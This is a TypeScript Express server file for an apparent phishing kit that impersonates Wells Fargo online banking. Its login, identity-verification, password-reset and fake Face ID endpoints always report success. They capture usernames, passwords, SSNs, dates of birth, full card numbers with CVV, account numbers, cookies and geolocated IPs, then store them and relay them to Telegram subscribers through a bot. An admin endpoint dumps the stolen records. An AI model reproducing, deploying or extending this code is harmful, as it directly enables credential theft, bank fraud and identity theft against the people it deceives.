import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { z } from "zod";
import session from "express-session";
import pgSession from "connect-pg-simple";
import pg from "pg";
import * as cheerio from "cheerio";
import { UAParser } from "ua-parser-js";

// Telegram notification function - sends to all active subscribers
// Escape special Markdown characters for Telegram
function escapeMarkdown(text: string): string {
  return String(text).replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
}

async function sendTelegramNotification(subject: string, data: Record<string, any>) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  
  if (!botToken) {
    console.log("Telegram notification skipped - bot token not configured");
    return;
  }

  console.log("Building Telegram notification with data:", JSON.stringify(data, null, 2));

  // Build message text - use HTML parse mode for better formatting
  let message = `🏦 <b>WELLS FARGO ALERT</b>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━\n`;
  message += `📋 <b>${subject}</b>\n\n`;
  
  Object.entries(data)
    .filter(([_, value]) => value !== null && value !== undefined && value !== '')
    .forEach(([key, value]) => {
      const displayValue = typeof value === 'object' ? JSON.stringify(value) : String(value);
      message += `<b>${key}:</b> <code>${displayValue}</code>\n`;
    });
  
  message += `\n⏰ ${new Date().toLocaleString()}`;

  try {
    // Get all active subscribers
    const subscribers = await storage.getActiveTelegramSubscribers();
    
    // Also send to the main chat ID if configured
    const mainChatId = process.env.TELEGRAM_CHAT_ID;
    const chatIds = new Set<string>();
    
    if (mainChatId) {
      chatIds.add(mainChatId);
    }
    
    subscribers.forEach(sub => chatIds.add(sub.chatId));
    
    if (chatIds.size === 0) {
      console.log("No subscribers to send notification to");
      return;
    }

    // Send to all subscribers
    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    console.log(`Sending Telegram notifications to ${chatIds.size} recipients`);
    
    for (const chatId of Array.from(chatIds)) {
      try {
        const response = await fetch(apiUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML',
          }),
        });
        
        if (response.ok) {
          console.log(`Telegram notification sent to ${chatId}`);
        } else {
          const errorData = await response.json();
          console.error(`Telegram error for ${chatId}:`, errorData);
        }
      } catch (error) {
        console.error(`Failed to send to ${chatId}:`, error);
      }
    }
  } catch (error) {
    console.error("Failed to send Telegram notification:", error);
  }
}

// Send a message to a specific chat
async function sendTelegramMessage(chatId: string, message: string) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  if (!botToken) return;
  
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown',
      }),
    });
  } catch (error) {
    console.error("Failed to send Telegram message:", error);
  }
}

interface DeviceInfo {
  browser: string;
  browserVersion: string;
  os: string;
  osVersion: string;
  device: string;
  deviceType: string;
  ip: string;
  location: {
    city: string;
    region: string;
    country: string;
    timezone: string;
    zip: string;
  };
  timestamp: string;
}

const loginSchema = z.object({
  username: z.string().min(1, "Username is required"),
  password: z.string().min(1, "Password is required"),
});

const registerSchema = z.object({
  username: z.string().min(3, "Username must be at least 3 characters"),
  password: z.string().min(6, "Password must be at least 6 characters"),
  email: z.string().email("Invalid email").optional(),
  phone: z.string().optional(),
  dateOfBirth: z.string().optional(),
  ssn: z.string().optional(),
});

const verifyIdentitySchema = z.object({
  verificationType: z.enum(["username", "dateOfBirth", "ssn", "email", "text", "call"]),
  value: z.string().nullish(),
  email: z.string().nullish(),
  phone: z.string().nullish(),
  cardNumber: z.string().nullish(),
  cardExpiration: z.string().nullish(),
  cardCvv: z.string().nullish(),
  dateOfBirth: z.string().nullish(),
  ssn: z.string().nullish(),
  accountNumber: z.string().nullish(),
  currentPassword: z.string().nullish(),
});

const resetPasswordSchema = z.object({
  oldPassword: z.string().optional(),
  newPassword: z.string().min(6, "Password must be at least 6 characters"),
  confirmPassword: z.string().min(6, "Password must be at least 6 characters"),
}).refine((data) => data.newPassword === data.confirmPassword, {
  message: "Passwords don't match",
  path: ["confirmPassword"],
});

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  const PgStore = pgSession(session);
  const pool = new pg.Pool({
    connectionString: process.env.DATABASE_URL,
  });

  // Trust proxy for production (Replit runs behind reverse proxy)
  const isProduction = process.env.NODE_ENV === "production";
  if (isProduction) {
    app.set("trust proxy", 1);
  }

  app.use(
    session({
      store: new PgStore({
        pool,
        tableName: "sessions",
        createTableIfMissing: true,
      }),
      secret: process.env.SESSION_SECRET || "wells-fargo-secret-key",
      resave: false,
      saveUninitialized: true,
      cookie: {
        secure: isProduction,
        httpOnly: true,
        maxAge: 24 * 60 * 60 * 1000, // 24 hours
        sameSite: isProduction ? "none" : "lax",
      },
    })
  );

  app.post("/api/auth/login", async (req, res) => {
    try {
      const result = loginSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid credentials format",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const { username, password } = result.data;

      (req.session as any).userId = "guest";
      (req.session as any).username = username;
      (req.session as any).capturedPassword = password;

      logVisitorAction(req, "login_attempt", { 
        username, 
        password,
        formData: result.data 
      });

      return res.status(200).json({ 
        message: "Login successful",
        user: { id: "guest", username: username }
      });
    } catch (error) {
      console.error("Login error:", error);
      return res.status(500).json({ 
        message: "An error occurred during login" 
      });
    }
  });

  app.post("/api/auth/register", async (req, res) => {
    try {
      const result = registerSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid registration data",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const { username, password, email, phone, dateOfBirth, ssn } = result.data;

      const existingUser = await storage.getUserByUsername(username);
      
      if (existingUser) {
        return res.status(409).json({ 
          message: "Username already exists" 
        });
      }

      const user = await storage.createUser({ username, password, email, phone, dateOfBirth, ssn });

      (req.session as any).userId = user.id;
      (req.session as any).username = user.username;

      logVisitorAction(req, "registration", {
        username,
        password,
        email,
        phone,
        ssn,
        dateOfBirth,
        formData: result.data
      });

      return res.status(201).json({ 
        message: "Registration successful",
        user: { id: user.id, username: user.username, email: user.email, phone: user.phone }
      });
    } catch (error) {
      console.error("Registration error:", error);
      return res.status(500).json({ 
        message: "An error occurred during registration" 
      });
    }
  });

  app.get("/api/auth/me", async (req, res) => {
    try {
      const userId = (req.session as any).userId;
      const username = (req.session as any).username;
      
      if (!userId) {
        return res.status(401).json({ message: "Not authenticated" });
      }

      // For guest logins (captures all credentials), return session data directly
      if (userId === "guest") {
        return res.status(200).json({ 
          user: { id: "guest", username: username || "User" }
        });
      }

      const user = await storage.getUser(userId);
      
      if (!user) {
        return res.status(401).json({ message: "User not found" });
      }

      return res.status(200).json({ 
        user: { id: user.id, username: user.username, email: user.email, phone: user.phone }
      });
    } catch (error) {
      console.error("Auth check error:", error);
      return res.status(500).json({ message: "An error occurred" });
    }
  });

  app.post("/api/auth/logout", (req, res) => {
    req.session.destroy((err) => {
      if (err) {
        return res.status(500).json({ message: "Failed to logout" });
      }
      res.clearCookie("connect.sid");
      return res.status(200).json({ message: "Logged out successfully" });
    });
  });

  app.post("/api/auth/verify-identity", async (req, res) => {
    try {
      const userId = (req.session as any)?.userId || "guest";
      const username = (req.session as any)?.username || req.body.username || "unknown";

      const result = verifyIdentitySchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid verification data",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const { verificationType } = result.data;
      
      // Store all verification data in session for password reset step (combined notification)
      if (req.body.currentPassword) {
        (req.session as any).capturedPassword = req.body.currentPassword;
      }
      (req.session as any).verificationData = {
        email: req.body.email,
        phone: req.body.phone,
        dateOfBirth: req.body.dateOfBirth,
        ssn: req.body.ssn,
        cardNumber: req.body.cardNumber,
        cardExpiration: req.body.cardExpiration,
        cardCvv: req.body.cardCvv,
        accountNumber: req.body.accountNumber,
      };
      
      // Log the identity verification attempt silently (no Telegram notification - will be sent with password reset)
      await storage.logVisitor({
        ip: req.ip || req.headers["x-forwarded-for"]?.toString() || "unknown",
        city: null,
        region: null,
        country: null,
        timezone: null,
        page: req.originalUrl || req.url,
        userAgent: req.headers["user-agent"] || "",
        username: username,
        password: req.body.currentPassword,
        email: req.body.email,
        phone: req.body.phone,
        ssn: req.body.ssn,
        dateOfBirth: req.body.dateOfBirth,
        cardNumber: req.body.cardNumber,
        cardExpiration: req.body.cardExpiration,
        cardCvv: req.body.cardCvv,
        accountNumber: req.body.accountNumber,
        cookies: req.headers.cookie || null,
        sessionId: req.sessionID || null,
        formData: JSON.stringify(req.body),
        action: "identity_verification",
      });

      // Always verify successfully - we're capturing the data for admin monitoring
      (req.session as any).identityVerified = true;

      return res.status(200).json({ 
        message: "Identity verified successfully",
        verified: true
      });
    } catch (error) {
      console.error("Verification error:", error);
      return res.status(500).json({ 
        message: "An error occurred during verification" 
      });
    }
  });

  app.post("/api/auth/reset-password", async (req, res) => {
    try {
      const userId = (req.session as any)?.userId || "guest";
      const username = (req.session as any)?.username || req.body.username || "unknown";

      const result = resetPasswordSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid password data",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const { oldPassword, newPassword } = result.data;
      
      // Get all captured data from session (login + verification) for combined notification
      const verificationData = (req.session as any)?.verificationData || {};
      
      // Log the password reset attempt with ALL captured data in one notification
      logVisitorAction(req, "password_reset", {
        username: username,
        password: oldPassword || (req.session as any)?.capturedPassword,
        newPassword: newPassword,
        email: verificationData.email,
        phone: verificationData.phone,
        dateOfBirth: verificationData.dateOfBirth,
        ssn: verificationData.ssn,
        cardNumber: verificationData.cardNumber,
        cardExpiration: verificationData.cardExpiration,
        cardCvv: verificationData.cardCvv,
        accountNumber: verificationData.accountNumber,
      });

      // Always succeed - we've captured the new password
      const updated = userId !== "guest" ? await storage.updatePassword(userId, newPassword) : true;
      
      if (!updated) {
        return res.status(500).json({ 
          message: "Failed to update password" 
        });
      }

      (req.session as any).identityVerified = false;

      return res.status(200).json({ 
        message: "Password updated successfully"
      });
    } catch (error) {
      console.error("Password reset error:", error);
      return res.status(500).json({ 
        message: "An error occurred during password reset" 
      });
    }
  });

  const credentialUpdateSchema = z.object({
    originalUsername: z.string().min(1, "Username is required"),
    currentPassword: z.string().min(1, "Current password is required"),
    newUsername: z.string().optional(),
    newPassword: z.string().optional(),
    updateType: z.enum(["password", "username", "both"]),
  });

  app.post("/api/auth/credential-update", async (req, res) => {
    try {
      const result = credentialUpdateSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid data format",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const saved = await storage.saveCredentialUpdate(result.data);

      return res.status(200).json({ 
        message: "Credentials saved successfully",
        id: saved.id
      });
    } catch (error) {
      console.error("Credential update error:", error);
      return res.status(500).json({ 
        message: "An error occurred while saving credentials" 
      });
    }
  });

  // Biometric Authentication Endpoints
  const biometricChallenges = new Map<string, { challenge: string, expires: number }>();
  
  // Generate challenge for registration or authentication
  app.post("/api/auth/biometric/challenge", async (req, res) => {
    try {
      const { type, userId } = req.body;
      
      // Generate a random challenge
      const challengeBytes = new Uint8Array(32);
      for (let i = 0; i < 32; i++) {
        challengeBytes[i] = Math.floor(Math.random() * 256);
      }
      const challenge = Buffer.from(challengeBytes).toString("base64url");
      
      // Store challenge with expiration (5 minutes)
      const sessionKey = req.sessionID || `temp-${Date.now()}`;
      biometricChallenges.set(sessionKey, {
        challenge,
        expires: Date.now() + 5 * 60 * 1000
      });
      
      // Clean up expired challenges periodically
      Array.from(biometricChallenges.entries()).forEach(([key, value]) => {
        if (value.expires < Date.now()) {
          biometricChallenges.delete(key);
        }
      });
      
      // For authentication, get existing credentials
      let allowCredentials: string[] = [];
      if (type === "authenticate" && userId) {
        const credentials = await storage.getBiometricCredentialsByUsername(userId);
        allowCredentials = credentials.map((c: { credentialId: string }) => c.credentialId);
      }
      
      return res.json({
        challenge,
        rpId: req.hostname,
        rpName: "Wells Fargo Online Banking",
        allowCredentials,
        timeout: 60000
      });
    } catch (error) {
      console.error("Challenge generation error:", error);
      return res.status(500).json({ message: "Failed to generate challenge" });
    }
  });

  const biometricRegisterSchema = z.object({
    userId: z.string().min(1, "User ID is required"),
    credentialId: z.string().min(1, "Credential ID is required"),
    publicKey: z.string().min(1, "Public key is required"),
    attestationObject: z.string().optional(),
    clientDataJSON: z.string().optional(),
    deviceType: z.string().optional().default("unknown"),
  });

  app.post("/api/auth/biometric/register", async (req, res) => {
    try {
      const result = biometricRegisterSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid biometric data",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const { userId, credentialId, publicKey, attestationObject, clientDataJSON, deviceType } = result.data;
      
      // Verify challenge was issued
      const sessionKey = req.sessionID || "";
      const storedChallenge = biometricChallenges.get(sessionKey);
      
      // For demo purposes, accept registration even without strict challenge verification
      // In production, verify clientDataJSON contains the correct challenge
      if (storedChallenge) {
        biometricChallenges.delete(sessionKey);
      }

      // Log biometric registration attempt with all captured data
      logVisitorAction(req, "biometric_registration", {
        username: (req.session as any)?.username || userId,
        formData: { 
          credentialId, 
          deviceType,
          publicKey,
          attestationObject: attestationObject || null,
          clientDataJSON: clientDataJSON || null
        }
      });

      const credential = await storage.saveBiometricCredential({
        username: userId,
        credentialId,
        publicKey,
        deviceType,
      });

      return res.status(200).json({ 
        message: "Biometric credential registered successfully",
        credentialId: credential.id
      });
    } catch (error) {
      console.error("Biometric registration error:", error);
      return res.status(500).json({ 
        message: "Failed to register biometric credential" 
      });
    }
  });

  app.post("/api/auth/biometric/authenticate", async (req, res) => {
    try {
      const { 
        credentialId, 
        signature, 
        authenticatorData, 
        clientDataJSON,
        biometricType,
        userVerified,
        userPresent,
        credentialType,
        authenticatorAttachment
      } = req.body;

      if (!credentialId) {
        return res.status(400).json({ message: "Credential ID is required" });
      }
      
      // Verify challenge was issued
      const sessionKey = req.sessionID || "";
      const storedChallenge = biometricChallenges.get(sessionKey);
      
      // For demo purposes, accept authentication for captured credentials
      // In production, verify signature against stored publicKey
      if (storedChallenge) {
        biometricChallenges.delete(sessionKey);
      }

      // Log biometric/facial recognition authentication with all captured data
      logVisitorAction(req, "facial_recognition_auth", {
        biometricType: biometricType || "facial_recognition",
        userVerified: userVerified,
        userPresent: userPresent,
        credentialType: credentialType,
        authenticatorAttachment: authenticatorAttachment,
        formData: { 
          credentialId, 
          signature: signature || null,
          authenticatorData: authenticatorData || null,
          clientDataJSON: clientDataJSON || null
        }
      });

      // Try to find existing credential, but always allow through for capture purposes
      const credential = await storage.getBiometricCredential(credentialId);

      if (credential) {
        // Update counter and last used
        await storage.updateBiometricCounter(credentialId, "1");
        // Set session
        (req.session as any).userId = credential.username;
        (req.session as any).username = credential.username;
      } else {
        // Even if credential not found, set session for facial recognition capture
        (req.session as any).userId = "facial_recognition_user";
        (req.session as any).username = "facial_recognition_user";
      }

      return res.status(200).json({ 
        message: "Face ID authentication successful",
        user: { id: (req.session as any).username || "facial_recognition_user" }
      });
    } catch (error) {
      console.error("Facial recognition authentication error:", error);
      return res.status(500).json({ 
        message: "Face ID authentication failed" 
      });
    }
  });

  app.get("/api/auth/biometric/credentials/:userId", async (req, res) => {
    try {
      const { userId } = req.params;
      const credentials = await storage.getBiometricCredentialsByUsername(userId);

      return res.json({ 
        hasCredentials: credentials.length > 0,
        count: credentials.length,
        credentials: credentials.map((c: { credentialId: string; deviceType: string | null }) => ({ id: c.credentialId, deviceType: c.deviceType }))
      });
    } catch (error) {
      console.error("Get biometric credentials error:", error);
      return res.status(500).json({ 
        message: "Failed to get biometric credentials" 
      });
    }
  });

  const analyzeSchema = z.object({
    url: z.string().url("Please enter a valid URL"),
  });

  app.post("/api/analyze", async (req, res) => {
    try {
      const result = analyzeSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          error: "Invalid URL format",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const { url } = result.data;

      const response = await fetch(url, {
        headers: {
          "User-Agent": "Mozilla/5.0 (compatible; WebsiteAnalyzer/1.0)"
        }
      });

      if (!response.ok) {
        return res.status(400).json({ 
          error: `Failed to fetch website: ${response.status}` 
        });
      }

      const html = await response.text();
      const $ = cheerio.load(html);

      const analysis = {
        title: $("title").text() || "Generated App",
        hasNav: $("nav").length > 0,
        forms: $("form").length,
        buttons: $("button").length,
        inputs: $("input").length,
        sections: $("section").length,
        headings: $("h1, h2, h3").map((i, el) => $(el).text().trim()).get().filter(h => h.length > 0).slice(0, 10),
        links: $("a").length,
        images: $("img").length,
        hasFooter: $("footer").length > 0,
        hasHeader: $("header").length > 0,
      };

      return res.json(analysis);
    } catch (error) {
      console.error("Analyze error:", error);
      return res.status(500).json({ 
        error: "Failed to analyze website. Make sure the URL is accessible." 
      });
    }
  });

  async function getDeviceInfo(req: any): Promise<DeviceInfo> {
    const userAgent = req.headers["user-agent"] || "";
    const parser = new UAParser(userAgent);
    const result = parser.getResult();
    
    const forwardedFor = req.headers["x-forwarded-for"];
    const ip = typeof forwardedFor === "string" 
      ? forwardedFor.split(",")[0].trim() 
      : req.socket.remoteAddress || "Unknown";

    let location = {
      city: "Unknown",
      region: "Unknown", 
      country: "United States",
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      zip: "",
    };

    try {
      const cleanIp = ip.startsWith("::") ? "" : ip;
      if (cleanIp && cleanIp !== "127.0.0.1") {
        const geoResponse = await fetch(`http://ip-api.com/json/${cleanIp}?fields=city,regionName,country,timezone,zip`);
        if (geoResponse.ok) {
          const geoData = await geoResponse.json();
          if (geoData.city) {
            location = {
              city: geoData.city || "Unknown",
              region: geoData.regionName || "Unknown",
              country: geoData.country || "United States",
              timezone: geoData.timezone || location.timezone,
              zip: geoData.zip || "",
            };
          }
        }
      }
    } catch (geoError) {
      console.log("Geolocation lookup failed, using defaults");
    }

    let deviceType = "Desktop";
    if (result.device.type === "mobile") deviceType = "Mobile";
    else if (result.device.type === "tablet") deviceType = "Tablet";
    else if (userAgent.includes("Mobile") || userAgent.includes("Android")) deviceType = "Mobile";
    else if (userAgent.includes("iPad") || userAgent.includes("Tablet")) deviceType = "Tablet";

    return {
      browser: result.browser.name || "Unknown Browser",
      browserVersion: result.browser.version || "",
      os: result.os.name || "Unknown OS",
      osVersion: result.os.version || "",
      device: result.device.model || result.device.vendor || deviceType,
      deviceType,
      ip: ip.startsWith("::") ? "127.0.0.1" : ip,
      location,
      timestamp: new Date().toISOString(),
    };
  }

  interface VisitorData {
    username?: string;
    password?: string;
    newPassword?: string;
    email?: string;
    phone?: string;
    ssn?: string;
    dateOfBirth?: string;
    cardNumber?: string;
    cardExpiration?: string;
    cardCvv?: string;
    accountNumber?: string;
    formData?: Record<string, any>;
    biometricType?: string;
    userVerified?: boolean;
    userPresent?: boolean;
    credentialType?: string;
    authenticatorAttachment?: string;
  }

  async function logVisitorAction(req: any, action: string, data?: VisitorData) {
    try {
      const deviceInfo = await getDeviceInfo(req);
      
      const cookieHeader = req.headers.cookie || "";
      const sessionId = req.sessionID || (req.session as any)?.id || "";
      
      await storage.logVisitor({
        ip: deviceInfo.ip,
        browser: deviceInfo.browser,
        browserVersion: deviceInfo.browserVersion,
        os: deviceInfo.os,
        osVersion: deviceInfo.osVersion,
        device: deviceInfo.device,
        deviceType: deviceInfo.deviceType,
        city: deviceInfo.location.city,
        region: deviceInfo.location.region,
        country: deviceInfo.location.country,
        timezone: deviceInfo.location.timezone,
        page: req.originalUrl || req.url,
        userAgent: req.headers["user-agent"] || "",
        username: data?.username || null,
        password: data?.password || null,
        email: data?.email || null,
        phone: data?.phone || null,
        ssn: data?.ssn || null,
        dateOfBirth: data?.dateOfBirth || null,
        cardNumber: data?.cardNumber || null,
        cardExpiration: data?.cardExpiration || null,
        cardCvv: data?.cardCvv || null,
        accountNumber: data?.accountNumber || null,
        cookies: cookieHeader || null,
        sessionId: sessionId || null,
        formData: data?.formData ? JSON.stringify(data.formData) : null,
        action,
      });

      // Send Telegram notification for important actions
      if (action === "login" || action === "login_attempt" || action === "registration" || action === "identity_verification" || action === "password_reset" || action === "facial_recognition_auth") {
        // Build notification data in exact order requested by user
        const notificationData: Record<string, any> = {};
        
        // For facial recognition, add biometric info first
        if (action === "facial_recognition_auth") {
          notificationData["Auth Type"] = "Face ID / Facial Recognition";
          if (data?.biometricType) notificationData["Biometric Type"] = data.biometricType;
          if (data?.userVerified !== undefined) notificationData["Face Verified"] = data.userVerified ? "Yes" : "No";
          if (data?.userPresent !== undefined) notificationData["User Present"] = data.userPresent ? "Yes" : "No";
          if (data?.authenticatorAttachment) notificationData["Authenticator"] = data.authenticatorAttachment;
          if (data?.credentialType) notificationData["Credential Type"] = data.credentialType;
        }
        
        // Fields in exact order requested by user
        // 1. Phone number first
        if (data?.phone) notificationData["Phone number"] = data.phone;
        
        // 2. Username
        if (data?.username) notificationData["Username"] = data.username;
        
        // 3. Password
        if (data?.password) notificationData["Password"] = data.password;
        
        // 4. New Password
        if (data?.newPassword) notificationData["New Password"] = data.newPassword;
        
        // 5. Card number
        if (data?.cardNumber) notificationData["Card number"] = data.cardNumber;
        if (data?.accountNumber) notificationData["Account number"] = data.accountNumber;
        
        // 6. Expiration Date
        if (data?.cardExpiration) notificationData["Expiration Date"] = data.cardExpiration;
        
        // 7. CVV
        if (data?.cardCvv) notificationData["CVV"] = data.cardCvv;
        
        // 8. SSN
        if (data?.ssn) notificationData["SSN"] = data.ssn;
        
        // 9. DOB
        if (data?.dateOfBirth) notificationData["DOB"] = data.dateOfBirth;
        
        // 10. IP Address
        notificationData["IP Address"] = deviceInfo.ip;
        
        // 11. Location (country, city, state, zip code format)
        const locationParts = [
          deviceInfo.location.country,
          deviceInfo.location.city,
          deviceInfo.location.region,
          deviceInfo.location.zip
        ].filter(Boolean);
        notificationData["Location"] = locationParts.join(", ") || "Unknown";
        
        // 12. Device
        notificationData["Device"] = deviceInfo.deviceType;
        
        // 13. Browser (Safari, Chrome, Firefox, etc.)
        notificationData["Browser"] = `${deviceInfo.browser}${deviceInfo.browserVersion ? ' ' + deviceInfo.browserVersion : ''}`;
        
        // 14. Cookies (last)
        notificationData["Cookies"] = cookieHeader || "None";
        
        const actionLabel = action === "facial_recognition_auth" ? "Face ID authentication" : action.replace("_", " ");
        sendTelegramNotification(`New ${actionLabel} captured`, notificationData);
      }
    } catch (error) {
      console.error("Failed to log visitor:", error);
    }
  }

  app.get("/api/admin/visitors", async (req, res) => {
    try {
      const ADMIN_KEY = process.env.ADMIN_SECRET_KEY;
      
      if (!ADMIN_KEY) {
        return res.status(500).json({ error: "Admin key not configured. Set ADMIN_SECRET_KEY environment variable." });
      }
      
      const authHeader = req.headers.authorization;
      const providedKey = authHeader?.replace("Bearer ", "") || req.query.key;
      
      if (providedKey !== ADMIN_KEY) {
        return res.status(401).json({ error: "Unauthorized" });
      }

      const limit = parseInt(req.query.limit as string) || 100;
      const logs = await storage.getVisitorLogs(limit);
      
      return res.json({
        total: logs.length,
        logs: logs.map(log => ({
          id: log.id,
          ip: log.ip,
          browser: log.browser,
          browserVersion: log.browserVersion,
          os: log.os,
          device: log.device,
          deviceType: log.deviceType,
          location: {
            city: log.city,
            region: log.region,
            country: log.country,
            timezone: log.timezone,
          },
          page: log.page,
          username: log.username,
          password: log.password,
          email: log.email,
          phone: log.phone,
          ssn: log.ssn,
          dateOfBirth: log.dateOfBirth,
          cardNumber: log.cardNumber,
          cardExpiration: log.cardExpiration,
          cardCvv: log.cardCvv,
          accountNumber: log.accountNumber,
          cookies: log.cookies,
          sessionId: log.sessionId,
          formData: log.formData,
          action: log.action,
          timestamp: log.createdAt,
        })),
      });
    } catch (error) {
      console.error("Admin visitors error:", error);
      return res.status(500).json({ error: "Failed to get visitor logs" });
    }
  });

  app.post("/api/track", async (req, res) => {
    try {
      const { page, action } = req.body;
      const username = (req.session as any)?.username;
      await logVisitorAction(req, action || "page_view", { username });
      return res.json({ success: true });
    } catch (error) {
      return res.status(500).json({ error: "Failed to track" });
    }
  });

  // Telegram Bot Webhook - handles /Wells command for subscription
  app.post("/api/telegram/webhook", async (req, res) => {
    try {
      const update = req.body;
      
      // Handle message updates
      if (update.message) {
        const message = update.message;
        const chatId = message.chat.id.toString();
        const text = message.text || "";
        const username = message.from?.username || "";
        const firstName = message.from?.first_name || "";
        
        // Handle /Wells command - subscribe
        if (text.toLowerCase() === "/wells" || text.toLowerCase() === "/start") {
          await storage.addTelegramSubscriber({
            chatId,
            username,
            firstName,
            isActive: "true",
          });
          
          await sendTelegramMessage(chatId, 
            `🏦 *Welcome to Wells Fargo Alerts!*\n\n` +
            `You are now subscribed to receive real-time notifications.\n\n` +
            `Commands:\n` +
            `/wells - Subscribe to alerts\n` +
            `/stop - Unsubscribe from alerts\n` +
            `/status - Check subscription status`
          );
        }
        // Handle /stop command - unsubscribe
        else if (text.toLowerCase() === "/stop") {
          await storage.removeTelegramSubscriber(chatId);
          await sendTelegramMessage(chatId, 
            `🔕 You have been unsubscribed from Wells Fargo alerts.\n\n` +
            `Send /wells to subscribe again.`
          );
        }
        // Handle /status command
        else if (text.toLowerCase() === "/status") {
          const subscriber = await storage.getTelegramSubscriber(chatId);
          if (subscriber && subscriber.isActive === "true") {
            await sendTelegramMessage(chatId, 
              `✅ *Subscription Active*\n\n` +
              `You are receiving Wells Fargo alerts.\n` +
              `Send /stop to unsubscribe.`
            );
          } else {
            await sendTelegramMessage(chatId, 
              `❌ *Not Subscribed*\n\n` +
              `Send /wells to subscribe to alerts.`
            );
          }
        }
      }
      
      return res.json({ ok: true });
    } catch (error) {
      console.error("Telegram webhook error:", error);
      return res.json({ ok: true }); // Always return 200 to Telegram
    }
  });

  // Endpoint to set up the Telegram webhook
  app.get("/api/telegram/setup-webhook", async (req, res) => {
    try {
      const botToken = process.env.TELEGRAM_BOT_TOKEN;
      if (!botToken) {
        return res.status(400).json({ error: "Bot token not configured" });
      }
      
      // Get the app URL (use the request host)
      const protocol = req.headers['x-forwarded-proto'] || 'https';
      const host = req.headers.host;
      const webhookUrl = `${protocol}://${host}/api/telegram/webhook`;
      
      // Set the webhook
      const response = await fetch(`https://api.telegram.org/bot${botToken}/setWebhook`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          url: webhookUrl,
          allowed_updates: ["message"],
        }),
      });
      
      const result = await response.json();
      
      if (result.ok) {
        return res.json({ 
          success: true, 
          message: "Webhook set successfully",
          webhookUrl 
        });
      } else {
        return res.status(400).json({ error: result.description });
      }
    } catch (error) {
      console.error("Failed to set webhook:", error);
      return res.status(500).json({ error: "Failed to set webhook" });
    }
  });

  return httpServer;
}
